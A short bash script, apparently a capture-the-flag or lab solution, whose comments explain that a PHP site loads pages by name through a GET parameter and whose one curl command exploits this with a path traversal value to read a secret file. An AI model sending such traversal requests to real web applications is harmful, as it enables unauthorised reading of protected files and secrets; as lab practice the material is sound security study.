#! /usr/bin/env bash

# The secret is stored in a php file, whose location is known, but it cannot simply be accessed via GET.
# By looking at the page's behavior, the pages are rendered not by accessing them individually, but by
# sending its names to index.php via GET parameter. If the path of the file that contains the secret is
# passed in this parameter, the secret is displayed.
curl http://10.0.23.24:8002/level01/index.php?page=../secret/secret